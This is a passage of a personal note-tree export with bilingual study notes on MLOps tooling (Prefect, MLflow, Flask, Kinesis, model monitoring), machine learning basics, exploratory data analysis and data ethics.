   → explain what is a orchestation
   → set of tool to scheduled and monitoring, that work that you want yo accomplish, for example a ml pipeline
   → 90% time spent, another 10% is for work in modeling:
      ⇒ retries when api go down
      ⇒ malformed data
      ⇒ notification
      ⇒ observability into failure
      ⇒ conditional failure logic
      ⇒ timeouts
   → prefect is a solution to this negative

Prefect
- open source workflow orchesttration
- python base
- modern data stack
- native dask integration
- use dag-free workflow
- extraordinary developer experience
- transparent and observable orchestration rules
- a good practice: if __name__ == ‘__main__’:
- to start prefect: prefect orion start

Prefect on VM machine
- is his lection is used EC2, in my case I treid to create a docker
- is important that port 22 is open in SG rule, http/https and port tcp/upd in port 4200 to all
- in machine is necesary run conda and install orion prefect
- command: prefect orion start --host 0.0.0.0
- configure in local:
   → prefect config view
   → prefect config set PREFECT_API_URL="http://{ip}:{port}/api"
   → python {script}

Deployment prefect flow
- storage
   → prefect storage ls
   → prefect storage create
- prefect deployment create {file.py}
- </rich_text>
        <rich_text style="italic" foreground="#fd5e53">SubprocessFlowRunner</rich_text>
        <rich_text> is used to deploy in local storage
- prefect work-queue preview {queue id}
- prefect agent start {queue id}

Work Queues and agents
- is possible separate by tags the deployments, is possible get more control

Trhee ways of deploting a model
- experiment tracking:
   → desing
   → train, training pipeline
   → operate, deployment
- deployment:
   → batch, offline
      ⇒ run regularly
      ⇒ good when execute every time (hourly, daily, monthly)
      ⇒ get data from database
      ⇒ predicts, generally with last time used (hourly, daily or monthly)
      ⇒ save the result in another site
      ⇒ generate reports
   → online
      ⇒ running all the time
      ⇒ variances:
         • web service, http access
            ◇ this is one to one client-server
         • stream service, events listening
            ◇ using producers and cosumers
            ◇ this is possible many to many
            ◇ multiple services multiple consumers in the same time
            ◇ one example is a content moderation for example Youtube
               ▪ check copyright violations
               ▪ Porn explicity
               ▪ violence
- marketing:
   → the user send a petition and get the result

Web services, using flask and docker
- using the normal duration-prediction
- to test install libraries: `</rich_text>
        <rich_text foreground="#c0c0c0">pipenv install scikit-learn flask --python=3.9</rich_text>
        <rich_text>` this use pipenv
- to run: pipenv shell
- to test dependencies: pipenv install --dev package

Web Service from MLFlow
- Is necesary start mlflow server with artifacts in s3
- get id of model-run
- set_tracking_uri to mlflow
- check the forms of get the models

for the lambda role is necesary create PutRecord and PutRecords
the steps are:
- creating the role, this use the aws policy to lambdas, LambdaKinesisExecutionRole
   → this is a serverless function
   → in lambda handler, the event gets the data
- creating the lambda function, this is created with the same aws console
- creating the kinesis, with test is important the partition-key, with the command get the shard-id

Batch deploy
- turn the notebook for training a model into a notebook for applying the model
   → only get the model
   → the dataframe to predict
   → prepare the features
   → to big dataframe and with output in another location
- turn the notebook into a script
   → jupyter nbconvert --to script {name_notebook}
- clean it and parametrize
   → with main
   → using sys
   → I prefer use click

Batch: scheduling batch
- using prefect to deploy the batch
- is necesary a depploy to execute one this
- is possible send paramaters in deploy of prefect
- is possible call another flow using another flow

Monitoring of ML models
- check the degrade and need monitoring of model
- how to prepare:
   → service health
      ⇒ only uptime, mememory and latency
      ⇒ in production services
   → model performance
      ⇒ check the prediction of model
      ⇒ depending the type of problem
      ⇒ how it performs
      ⇒ did anything break
   → data quality and integrity
      ⇒ where it breaks
      ⇒ where to dig further
   → data and concept drift
      ⇒ is the model still relevant
   → performance by segment
   → model bias/fairness
   → outliers
   → explainability
- batch vs online service model
   → how to:
      ⇒ add ML metrics to service health monitoring
      ⇒ build an ML-focused dashboard
- monitoring:
   → send data to mongo(results)
   → send too monitoring service, metrics to prometheus and grafana
   → form: mlservice + usage simulation + logging + online monitoring
   → another: ML service + usage simulation + logging + online monitoring + batch monitoring, this create a HTML report
   → comunication by containers

Setting environment
- is necesary to this module, docker and docker-compose</rich_text>
      </node>
      <node name="ML Engineer" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663360401" ts_lastsave="1663361604">
        <rich_text>- Introduction to ML
   → </rich_text>
      </node>
      <node name="introduccion al ML por MindsDB" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666130308" ts_lastsave="1667156245">
        <rich_text>- aprender a preparar dats y visualizarlos
- entender diferentes algoritmos de machine learning
- explorar deep learning y redes neuronales

Historia del machine learning
- uso de algoritmos tpara identificar patrones en datos con el fin de resolver un problema de interes
- existen dos tipos
   → aprendizaje supervisado
   → aprendizaje no supervisado
- es usado actualmente en la vida de todo el mundo, spam de correos por ejemplo
- los modelos aprenden patrones de los features
- ml es un campo en crecimiento

herramientas para machine learning
- terminologia
   → data, unidades de informacion
   → features, tipos de informacion acerca de tus variables
   → filas, observaciones individuales o muestras
   → columnas, features que describen tus observaciones
   → outlier, puntos de datos que se comporta de forma extrania
   → pre-processing, preparar los datos para us uso en un modelo de ML
   → ETL pipeline, framework de data science para hacer ETL
- tipos de datos
   → numericos, de tipo entero o flotante
   → categoria, representan una clase o tipo, se representa con mapeo de numeros o un ohe-hot vector
   → image, se representa por una imagen
   → texto, es en forma de texto corto o largo
   → NaN, este tipo de datos es desconocido o perdido
- generalmente se usa 1-hot enconder para etiquets categoricas
- es muy importante poder saber que relacion tienen los features para poder saber que ML usar
- histogramas para ver la distribucion de un feature
- de dispersion permiten ver la relacion entre dos features

Tipos de modelos de machine learning
- aprendizaje no supervisado, objetivo desconocido, queremos encontrar estructura y grupos dentro de los datos
   → clustering, queremos encontrar grupos en los datos, k-means
   → dimesionality reduction, se busca encontrar que features de entrada en los datos son de ayuda, PCA
- aprendizaje supervisado, un objetivo a predecir
   → regresion, este es numerico, regresion lineal
   → clasificacion, este es una etiqueta, algo categorico, regresion logistica

La “receta” para aplicar algoritmos de ML
- ingredientes de los algoritmos de ml
- aprendizaje supervisado
- aprendizaje n supervisado
- proceso de decision, como los modelos hacen una prediccion o retornan una respuiesta
- funcion de error/coste como evaluar si los parametros enb el modelo generan buenas predicciones
- regla de actualizacion, como mejorar los parametros para hacer mejores predicciones
- normazizar datos numericos
   → para cada columan del dataset con valores numericos
      ⇒ calcular el promedio de los datos
      ⇒ calcular la desviacion estandar
- separar el dataset en 3
   → training, 60 a 80 para aprender patrones
   → validation, 0 a 20 verificacion que el modelo aprender
   → testing, 0 a 20 se apartan para revisar si el modelo fue exitoso al predecir

Algoritmos supervisados, regresion lineal
- existen tres:
   → lineal positivo, si x crece y crece
   → lineal negativa, si x crece y disminuye
   → no lineal
- el costo es la diferencia entre el valor del target y el valor predicho por nuestra linea
- regla de actualizacion, es la busqueda de minimizar la distancia entre lo predico y cada punto de datos en entrenamiento
- MSE y R^2, ayudan a identificar la fortaleza de la relacion entre features de entrada y de salida

Regresion logistica
- predice una clase/etiqueta
- la salida es la probabilidad para cada entrada, cualquiera arriba de 0.5 pasara
- usar el accuracy para el rendimiento

Arboles de decision
- mas arboles menos variacion pero ams computo
- max features, numero de features usados para partir
- max depth, el numero de niveles del arboles

aprendizaje no supervisado
- k-means
   → inertia, que tan cerca estan los puntos de datos al centroide, debe ser pequenio
   → silhouette score, que tan lejanos son los cluster de [-1, 1], este numeor debe ser cercano a 1

Redes neuronales
- entender la arquitectura basica de una red neuronal
- como funciona el entrenamiento de redes neuronales
- explorar como mejorar las redes neuronales
- es un modelo que usa neuronas y conexiones entre ellos para hacer predicciones tiene 3 capas base
   → capa de entrada
   → capa oculta
   → capa de salida
- capa de entrada, los pesos gobiernan la fuerza de conexion entre nodos, pesos altos == conexion fuerte
- la unidad escondida acepta una combinacion lineal de nmodos adjuntos a el
- la unidad oculta ejecuta una funcion en la combinacion lineal, esta es conocida como funcion de activacion
- para la capa de salida hay varias funciones de activacion algunas tienen rango limitado (softmax/sigmoid), mientras otras se extienden idefinidamente (ReLUs, Lineal)
- deep learning es aniadir mas capas

Como es el entrenamiento:
- se escoge una arquitectura
   → DNNs, Deep Feed-forward
      ⇒ funciones activacion
      ⇒ usada en muchos problemas complejos
   → CNNs, Convolucional
      ⇒ operador convucional, pool y kernels
      ⇒ usada en imagenes y genomicos
   → RNNs, Recurrentes
      ⇒ celdas de memoria/puerta
      ⇒ representa secuencias
      ⇒ usada en lenguaje
- receta de entrenamiento
   → preparar datos
   → computar la prediccion hacia adeltante
      ⇒ se evaluan las funciones en cada nodo
   → calcular la perdida
      ⇒ uso del error cuadratico medio (MSE), para regresion
      ⇒ uso de binary cross-entropy para clasificacion
      ⇒ categorical cross-entropy para clasificacion
   → backpropagation para ajustar los pesos
      ⇒ es la regla de actualizacion usada para ajustar los pesos en redes neuronales
      ⇒ se usa la derivada parcial, de ellos con respecto a cada nodo
   → cambiar desempenio de perdida, si es si se empieza desde la computacion
   → revisar el desempenio del equipo de prueba si el anterior es NO
- ajustar la tasa de entrenamiento

Mejorar las prediccion de redes neuronales
- dropout protege ante el overfitting
- las redes neuronales tienden al oerfitting debido a que tienen mucho parametros
- dropout es “ignoorar” algunos nodos mientras entrena</rich_text>
      </node>
      <node name="regresion lineal" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667334251" ts_lastsave="1667349933">
        <rich_text>que es la regresion lineal
- a un valor de x se le asigna un valor de Y
- se le tiene que ajustar una linea recta que mejor pase por los datos
- y = w_o + w_1 * x, w_0, es el intercepto y w_1 es la pendiente
- la variable a predecir es numerica?
- las variables independientes son primordialemente numericas?
- se cuenta con muchas variables categoricas y/o tienen muchos niveles?
- se empieza siempre con regresion lineal, si no funciona se pasa a otros
- reducir las variables lo mas que se pueda
- evitar multicolinealidad
- no se predice fuera del dominio de la variable independiente
- pasos del algoritmo:
   → se ajusta un modelo
   → se comparan resultados con reales
   → se ajustan pesos en el modelo
   → regreso a paso inicial si no se converge
- funcion de perdida: metodo de minimos cuadrados
- algoritmo de optimizacion: descenso del gradiente
- MSE: mean square error, se usa para evaluar funcion de perdida, si esta metrica desde el inicio es mala, el modelo puede que no se este ajustando, hay que revisar cual fue el minimo hallado por el modelo, a valores grandes peor se ajusta el mdelo
- R^2, coeficiente de determinacion, intenta mostrar que tan bien se ajusta el modelo con la varianza de los modelos, entre mas cerca de 1 es mejor

Regresion lineal multivariable
- es identico solo que con mas variables para obtenr el valor de y</rich_text>
      </node>
      <node name="fundamentos practicos de ML" unique_id="123" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667764572" ts_lastsave="1667764757">
        <rich_text>IA -&gt; ML -&gt; Deep Learning
Provee capacidad a un algoritmo de aprendizaje, ya sea por aprendizaje supervisado o no supervisado

Que es ML?
- definir un problema
- construccion del modelo y evaluacion
- deploy y mejoras</rich_text>
      </node>
    </node>
    <node name="estadistica inferencial" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="133" is_bold="0" foreground="" ts_creation="1654816797" ts_lastsave="1654816797"/>
    <node name="etica en el manejo de datos" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1654889158" ts_lastsave="1655056410">
      <rich_text>Que son los datos personales:
- datos que permiten identificar a una persona de manera directa o indirecta
- se pueden clasificar por jerarquia de importancia o riesgo, hay datos que son unicos y otros que permiten identificar a multiples personas
   → datos ordinarios, nombre, direcciones, finanzas
   → datos sensibles, origen etnico, opiniones politicas y religiosas, orientacion sexual
   → datos especiales, genericos, biometricos, de salud
- cuales no lo son
   → informacion anonimizada
   → datos de personas juridicas, aquellas que son de una institucion, solo los de individuos
   → informacion que no permita la identificacion
- en que diferencias los datos biometricos
   → son un tipo de datos personales
      ⇒ por naturaleza
         • universal
         • unico
         • permanente
      ⇒ segun sus caracteristicas
         • rasgos fisicos y fisiologicos
         • rasgos de comportamiento y personalidad

Escandalos historicos
- 1940, Holanda, por medio del censo se pudo saber datos de personas de origen judio, muerte del 75% de poblacion judia
- 2016 Mexico, problema del INE en el S3 de amazon con datos de personas

Intereses por la informacion
- cada vez se pueden procesar datos mas facilmente
- se puede analizar
- se usa para predecir y saber quien es el usuario
- el incremento de informacion se ha tenido que regular
- tipo y volumen de informacion que puede recolectar la informacion, deben de tener motivos de por que lo hacen
- de manera ilicita se compra y vende datos

Bias y GIGO en datos
- bias-&gt; sesgo, se toma una muestra que no es estadisticamente sifnificativa, extracto de nuestro universo
   → debe ser suficientemente grande para tener una buena muestra
   → un sesgo comun es cuando se trabaja con reconociemiento facial, se tiene mas fotos de personas blancas
- Garbage in, garbage out
   → la calidad del resultado depende de la calidad de entrada
   → la fuente debe de ser veraz

Advertencias de uso en marketing
- se puede crear publicidad personalizada
   → los usuario tiene el poder de decir y calificar los productos
   → sesgos discriminatorios
   → precios por informacion privilegiada
   → minupulacion de campanias politicas
   → formanto de conductas adictivas y ataques emocionales

Advertencias de uso en campanias politicas
- el gobierno se interesa en los datos
- Cambridge analitica ofrecia como manipular el comportamiento de la audiencia
   → datos propios a partir de cneutrnas
   → datos de redes como facebook
   → ciencia del comportamiento y modelos predictivos
- la empresa identificaba quien era vulnerable o quient enia una conciencia politica determinada, se manipula o se distorciona la realidad para no votar en la otra persona

Reglamentos
- penalizacion por mal uso de datos
- regulacion de datos
- ley federal de proteccion de datos personales en posesion de particulares, en mexico y en LatAm, se debe de justificar el por que se hace uso y recoleccion de los datos
   → todos los datos deben de ser de uso y seguros
- sansiona la compra de bases de datos personales
- GDPR, reglamente general de proteccion de datos
   → ley de la union europea para proteccion de datos tanto estando o no estando en el pais
   → permite tener un control de los usuario y de su control
   → se buisca la estandarizacion
   → aplica para cualquier empresa del mundo

Etica y deep learning
- vehiculos autonomos, reconocimiento de imagenes
   → aun sigue en pruebas
   → dilemas eticos hacen que no podemos ver o usar
   → peligros de ataques ciberneticos sobre el codigo
- reconocimiento facial
   → se basa en datos biometricos
   → del rostro completo o parcial
   → se basa en reconocimiento de vectores
   → se desarrolla para acceder a espacios fisicos con mayor facilidad
   → como usuario se puede decidir si otorgarlo o no
   → se debe de pensar tambien en el usuario y si es etico como proteger la informacion
   → en Mexico ya existe uso de este tipo de accesos para el papeleo
- etica en la pandemia
   → la pandemia ha sido un gran reto
   → uso de controles de acceso
- relaciones interpersonales
   → redes sociales, trabajo, uso de apps
   → las interacciones en el trabajo han evolucionado
   → ahora se conoce gente de manera no fisica
   → como devs de tecnologia debemos de garantizar un espacio seguro
   → funciones de audio, nosotros otorgamos acceso al microfono, se puede bloquear el acceso al microfono para que no nos muestre anuncios
   → redes sociales despues de la vida, cuando uno muere deja toda su huella electronica, una persona debe de elegir que hacer con las redes sociales
- etica en el NLP
   → investigacion de la interaccion entre PC y lenguaje humano, por medio de lenguas naturales
   → casi siempre es en ingles
   → un modelo desarrollado es micrsoft-alibaba vs stanford
      ⇒ el algoritmo gano la compresion lectora
   → gpt-3
      ⇒ lenguaje autoregresivo, aprendizaje profundo 
      ⇒ tiene como reto identificar que es real y que es falso

Data for good
- Politicas publicas
   → atencion del estado a una necesidad social
   → se pueden implmentar a partir de normas, instituciones, prestaciones y servicios
   → ayudan para alcanzar principios eticos e igualdad en sociedades
   → tipos de clasificacion
      ⇒ autoridad institucional, municipal, mundial, nacional
      ⇒ sector, medico, medio ambiente, edcicacion
      ⇒ destinatarios, a quien van dirigidas
      ⇒ elaboracion, participativa o autoritaria
      ⇒ planificacion, anticipativa o reactiva
- Datos y prevencion de crimenes
   → a partir de dos tipos de recoleccion
      ⇒ en camaras, de tipo reactivo
      ⇒ por medio de reportes
      ⇒ preventiva a partir de donde pude suceder algun crimen
- datos y salud
   → por medio de prediccion se puede tener una oportunidad
   → el uso de apple watch para ver como se esta comportando nuestro sistema
- movilidad
   → no solo tiene que ver con vehiculos motorizados
   → se facilita la movilidad y recolectan informacion gracias a un radar
   → lo datos que se recolectan se pueden analizar, para saber como es el flujo de la ciudad, esto ayuda a crear politicas publicas
   → ciudades inteligentes a partir de los datos, emplean tecnologia para anticiparse
   → la otra cara de la moneda
      ⇒ dilema etico, muchas zonas pueden ser discriminadas, nos diriguen siempre por vias principales ya que son mas seguras, eso hace un flujo mayor
- educacion
   → las escuelas online permiten trackear los resultados
   → nos ayuda a recomendarnos algunos cursos
   → algoritmos para mejorar la experiencia
- medio ambiente:
   → reactivo, que se puede hacer despues de que algo ya sucedio
   → por medio de predicciones podemos saber si se puede realizar alguna actividad de acuerdo a como esta el ambiente
   → se puede evaluar para saber si algo esta en optimas condiciones


¿Qué podría generar un anuncio sin planificación ética?
La falta de estandarizaci√≥n de un protocolo ante la pandemia es un ejemplo de dilema √©tico y de debate. Esto es:
</rich_text>
    </node>
    <node name="curso EDA" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655834724" ts_lastsave="1656024455">
      <rich_text>Desarrollo de tecnicas para entender y explorar que dice un dataset, como plantear un modelo de machine learning, hacer un analisis de datos exploratorio completo

Que es el analisis exploratorio de datos (EDA)
- KDD knowledge discovery in databases
- SEMMA, sample, explore, modify, model and assess
- CRISP-DM, Cross industry standar process for data mining
- esto nace por la mineria de datos, se busca conocimiento de todos los datos que tenemos
- metodologia para poner un orden
   → empiezan los requerimientos, necesidad a contestar
   → que informacion se tiene para llegar al objetivo
   → como se esta procesando, que tipos de datos, la data es correcta o no
   → procesada y recolectada podemos entenderla
   → tengo suficiente informacion o no
- etapas:
   → definicion del problema
   → preparacion de los datos
   → analisis de datos
   → desarrollo y presentacion de los resultados
   → * si se puede hacer con toda la base de datos es recomendable

EDA vs Clasico vs Bayesiano
- clasico, resultados directo a la comunicacion, lo saca y lo muestra, se hace el analisis y no se sabe que mas se puede o se va a hacer con el, no se da contexto del problema a resolver
- bayesiano, Prior probability, que paso anteriormente para predecir el futuro, que puede pasar con este modelo y que se puede enterder
- EDA, este se busca que sea totalmente dinamico, se lanza un modelo de machine learning o IA o automatizacion o un insight al negocio, este es el primer paso a la ciencia de datos

Tools
- python jupyter
- AWS sagemaker, se puede llevar a prod por medio de este, se paga por lo que se usa
- Spark usando EMR, esto es para grandes volumenes, si es para tiempo real se debe de pensar que se usara y que necesidades tengo
- google tiene sus jupyter y jupyter-lab
- azure notebooks, este solo se hace experimentacion, los modelos se deben de pasar directamente a plataforma
- R - Rstudio, la mejor opcion si se necesitan librerias que esten con documentacion cientifica
- KNIME, si sabes a nivel negocio que se requiere, pero no hay tecnicos

Visualizaciones de EDA
- se usa el dataset zoo.data
- uso de altair para visualizar datos, se tiene que saber cual es la X y y la Y a usar, la ventaja es que se pueden exportar a PNG o a SVG, esta es visual
   → mark_line para graficas con lineas
   → mark_bar para tener una grafica de barras
- uso de plotly, es de paga
   → esta hace algunos calculos por si misma
   → se usan pie para ver de manera general que estamos haciendo
   → se le puede poner el title en la misma grafica

Transformacion de datos
- uso de chicago data, se usa map_plot
- generalmente se hacen el cambio de fechas (en python con csv) o los cambios de tipos de datos float -&gt; int

Estadistica descriptiva
- se busca contar la historia de a que hora fueron los accidentes y donde
- se trata de describir las variables para tener una solucion al problema dado
- crosstab de pandas para saber que el dataset esta parejo para las variables que se usaran

Distribucion de los datos
- se debe de entender la naturaleza de los datos que se estan graficando o viendo
- var continua, puede tomar cualquier valor dentro de un intervalo
- var discreta, no puede tomar ningun valor entre dos consecutivos
- que tipos de distribuciones pueden existir
- en que nos puede ayudar en saber la distribucion, se puede coneocer por medio de la graficacion
- obtencion de ajuste de curva

Medidas de tendencia central
- como se comporta una poblacion
- no se puede predecir el comportamiento individual, pero sie el comportamiento promedio
- ley de los grandes numero, bajo ciertas condiciones generales la media de n variables aleatorias se aproxima a la media de las n medias, se puede hacer una aproximacion de la distribucion
- teorema del limite central
   → cuando el tamanio de la muestra es lo suficientemente grande, la distribucion de las medias sigue a una distribucion normal
- otras medidas
   → media, moda, mediana, min, max, producto de valores, suma acumulada

Medidas de dispersion
- desviacion estandar, repasa la cantidad de dispersion de los datos de una poblacion entera
   → que tan separados estan los datos
- Varianza, encontrar que tan diferentes estan los datos
- asimetria estadistica (skewness), ayuda a saber que forma hay de los datos sin necesidad de graficarlos, esta se puede saber de acuerdo a la moda, mediana y media
   → moda &lt; mediana &lt; media, positivo skew
   → moda = mediana = media, simetrico skew
   → moda &gt; mediana &gt; media, negativa skew
- kurtosis
   → es una caracteristica para saber que tan acumulados estan los datos
   → nos ayuda a saber que tan probable es que se tenga una variable

tablas pivote y cross tabulations
- puede sacar la varibilidad sobre todo el dataset, de acerudo a una agrupacion de campos
- cross tab, se da un rango donde estan las condiciones dadas

Correlacion
- es la relacion que guarda entre una variable y otra
- es un porcentaje donde se dice que corresponde un dato con otro dato

Analisis de series de tiempo
- como se comporta una variable a lo largo del tiempo
- uso de quandl
   → dataset FRED/GDP
   → dataset CHRIS/CME_GC1
- dataframe open power system data

Desarrollo y evaluacion de modelo
- se deben de tener pruebas de hipotesis (este depdnde de la ditribucion y tipos de datos)
   → Anova, comprabacion muy especifica entre ciertos tipos de datos
   → Z-test
   → T-test
   → chi squared test, si no se sabe la distribucion
- p value, es el valor que esta entre el intervalo del 5%, si no cae aqui quiere decir que se tiene una probabilidad de exito, si es menor a esto se acepta o rechaza de acuerdo a que sea cierta, esto solo se hace dentro del analisis de datos de la muestra
- siempre se deben de dividir los datos en dos, entrenamiento y testing
- se entrena el modelo
- se evalua
   → presicion= VP / (VP + FP)
   → exactitud= (VP + VN) / (VP + FP + FN + VN)
      ⇒ sig: vp = verdadero positivo, fp = falso positivo, vn = verdadero negativo, fn = falso negativo
- el modelo puede ser preciso pero no exacto

Regresion y evaluacion de hipotesis
- tipos de regresores
   → NNR
   → Decision Tree
   → LASSO
   → Ridge
   → ElasticNet
- uso de classification_report, esete da precision, recall (sensibilidad), f1-score, supponrt, se le envia la original contra la predicha
- uso de confusion_matrix, y original contra y predicha, dice cuando falsos positivos y negativos se tienen

Analisis exploratorio completo
- uso de describe para saber que set tiene
- se analiza la density
- se debe de tener un objetivo a analizar, en el caso de los vinos la calidad
- la correlacion nos ayuda para saber que variables usar
- mucho tiene que ver el experto para saber tambien que variables se deben de analizar, no es siempre a como tenemos la idea
- para hacer un ajuste de curva se debe de saber la distribucion


¿Cuáles son algunas propiedades de una serie de tiempo?
¿Qué es un análisis multivariable?
¿Qué comandos usamos para agrupar datos?
</rich_text>
    </node>
    <node name="Analisis exploratorio nuevo" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663875000" ts_lastsave="1664407703">
      <rich_text>
Introduccion
- proceso de conocer en detalle y darle sentido a los datos
- saber que tipos de datos son
- aqui se sabe como tratar a los datos
- se convierten en informacion util
- que razones se tiene para hcer este analisis
   → organizar y entender las variables
   → establecer relaciones entre variables
   → encontrar patrones ocultos en los datos
   → ayuda a escoger el modelo correcto para la necesidad correcta
   → ayudarte a tomar una decision informada
- pasos (es un proceso ciclico):
   → hacer preguntas
   → determinar el tamanio de los datos
   → categorizar las variables
   → Limpieza y validacion de datos
   → establecer relaciones entre los datos
- Tipos de analitica de datos
   → descriptiva: que sucedio, a pasado
   → diagnostica: por que sucedio, a pasado
   → predictiva: que podria pasar, a futuro
   → prescriptiva: que deberia de hacerse, a futuro
- Tipos de datos y analisis de variables
   → categoricos, genero, categoria de pelis
      ⇒ ordinal, un orden natural
      ⇒ nominal, no importa el orden
   → numericos
      ⇒ discreto, numero de amigos, enteros
      ⇒ continuo, altura, pero, longitud
   → Tipos de analisis:
      ⇒ univariado, obtener analisis de las variables solas
      ⇒ bivariado, se buscan las relaciones entre variables
      ⇒ multivariado, checar todas las variables que se tienen para saber como se relacionan
- Que es la recoleccion de datos
   → nos permite obtener informacion del tema de investigacion
   → hay tipos diferentes
      ⇒ primaria, se obtienen de primera mano, experimentos, entrevistas, se tiene el total control
      ⇒ secundaria, se obtiene por medio de una fuente primaria externa, aqui no se tiene control de como se hizo el conjunto de datos
      ⇒ terciaria, fuentes completamente extenas, se obtienen a travez de terceros como datos de otras empresas
   → que es la validacion de datos, proceso de revisar que tengan consistencia y precision de los datos
      ⇒ se validan
         • modelo de datos
         • seguimiento de formato estandar de archivos
         • tipos de datos
         • rango de variables
         • unicidad
         • consistencia de expresiones
         • valores nulos

Analisis univariable
- explorando una variable categorica
   → conteos y proporciones
      ⇒ se basan en la tabulacion
      ⇒ contabiliza la frecuancia de aparicion de cada valor unico de una variable
      ⇒ generalmente se ordenan por alfabeto o numero de aparicion
      ⇒ despues se puede hacer un diagrama de frecuencias
      ⇒ las proporciones es la relacion de correspondencia entre las partes del todo
- medidas de tendencia central
   → entienden comportamiento general de los datos
   → media, promedio
   → mediana, dato central
   → moda, dato que mas se repite
   → media ponderada, media armonica, media geometrica
- medidas de dispersion
   → que tan lejos o cerca se encuentran los datos
   → rango, se toma el valor minimo y maximo de los datos
   → rango intercuartilico, comprende el 25% arriba y abajo de la mediana
   → desviacion estandar, ofrece la dispersion media de una variable
      ⇒ la regla del 65, 95, 99, a una desviacion estandar ya tendremos el 65 de los datos a dos se tiene el 95 y a tres casi todos
   → boxplot para visualizar los estadisticos del conjunto de datos
   → existen la asimetria estadistica, sesgo negativo,simetrica, sesgo positivo
   → otra medida es la curtusis, que tan juntos o dispersos estan los datos respecto a la media o promedio, si es cero estan distribuidos homogeniamente a la media, cuando es positivo, estan concentrados al rededor de la media, cuando es menor a cero, los datos se distribuyen a lo largo de la media
- distribuciones
   → histogramas
   → funcion de probabilidad de masas, nos dice la probabilidad de que una variable aleatoria discreta tome un valor determinado
   → funcion de distribucion acumulada, devuelve la probabilidad de que una variable sea igual o menos que un valor determinado
   → funcion de probabilidad de densidad, determina la probabilidad de que una probabilidad continua tome un valor determinado

Analisis Bivariado
- relaciones
   → grafica de puntos
      ⇒ como se distribuyen los puntos entre dos variables
   → no siempre se tienen graficos que luzcan bien, mas cuando se tienen muchos datos
   → se puede modificar la transparencia de la grafica para que se vean mejor
   → histogramas de dos dimensiones, se pueden tener por colores la frecuencia, nos ayuda a ver mejor como se agrupan los datos, se pueden cambiar los colores para visualizar mejor
   → graficos de violin y boxplot
   → se pueden tener huecos o en lineas rectas, generalmente son en variables discretas, se puede agregar un ruido aleatorio
   → se puede visualizar un diagrama de caja
   → matrices de correlacion
   → hasta que punto las variables estan relacionadas entre si, cambian conjuntamente
   → se usa el coeficiente de correlacion, usualmente la de person, este sirve de forma lineal
   → causalidad, cuando algo genera otra cosa
   → correlacion no implica causalidad, no siempre dos eventos estan relacionados aunque lo paresca
- generalmente en las regresiones lineales no son simetricas, a-b no es lo mismo que b-a

Paradoja de simpson
- es un fenomeno en el cual se pueden concluir dos cosas totalmente opuestas a partir de los mismos datos, dependiendo el como se clasifican estos</rich_text>
    </node>
    <node name="machine learning curso udemy" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1664229102" ts_lastsave="1698801932">
      <rich_text>p = t</rich_text>
      <node name="que es el machine learning" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664229117" ts_lastsave="1664739247">
        <rich_text>es un subdominio de la IA, proporciona a los sistemas la capacidad de aprender y mejorar automaticamente, sin ser programados para ellos, es generalmente crear un modelo que se va mejorando con mas datos hacia el modelo a lo largo del tiempo (experiencia en datos)
se obtiene experiencia pasada, se determina un algoritmo de ML para el problema, se tomand los datos y se proporcionan al algoritmo que se decidio, este entrena y se construye el modelo
si el modelo es correcto, se pone en produccion
con el modelo, la base esta en los datos

Clasificacion de los sistemas de machine learning
- en funcion e la manera que entrenan:
   → supervisado
   → no supervisado
   → semi-supervisado
   → reforzado
- en la que aprenden en el tiempo, como lo van a traves del tiempo
   → online
   → batch
- en la que realizan predicciones
   → basado en instancias
   → basado en modelos

Aprendizaje supervisado y no supervisado
- supervisado
   → se mapea una entrada y una salida, en pares de ejemplo, se neceista un conjunto de datos de entrenamiento que estan etiquetados
   → se tienen reglas de tipo regresion y clasificacion:
      ⇒ regresion debe de ser un valor continuo
      ⇒ los de clasificacion se usan para predecir valores dicretos (valores muy acotados)
- no supervisado
   → se infiere una funcion que describe la estructura de un conjunto de datos *sin etiquetar*
   → generalmente se usan cuando se tienen muchos datos y es un poco dificil etiquetarlos por un analista

Aprendizaje online y batch
- aqui es como se ingiere la data a lo largo del tiempo
- batch:
   → no aprenden de manera incremental, se entrenan todos los datos disponibles en un momento especifico
   → si se tiene un nuevo tipo de dato se debe de entrenar con todos los datos disponibles
   → solucion sencilla
   → funciona muy bien para conjunto de datos no muy grandes, ni que se requiera adaptar rapidamente
   → restringido para dispositivos de capacidad limitada, como un smartphone
- online
   → se entrenan incrementalmente, pueden ser datos individuales o pequenios grupos
   → solucion ideal para sistemas que reciben datos continuos y se requieren adapatar a ellos de forma rapida
   → es capaz de lidiar con grandes conjuntos de datos, que puede que no entren en una sola maquina
   → aparecen variables importantesque hay que determinar, como el ratio de aprendizaje
   → pueden ser muy inestables, si hay datos de baja calidad

Aprendizaje basado en instancias y basado en modelos
- instancias
   → el sistema aprende los ejemplos y luego intenta generalizar para nuevos ejemplares
   → se requiere una medida de similitud
   → la medida de similitud se usa para comprar con los ejemplos para ver si el ejemplo nuevo que tan cercano esta de los demas datos
- modelos
   → se crea un modelo que describe el conjunto de datos
   → se requiere ajustar los parematros del modelo
   → aqui no se valida la distancia, es a traves del modelo</rich_text>
      </node>
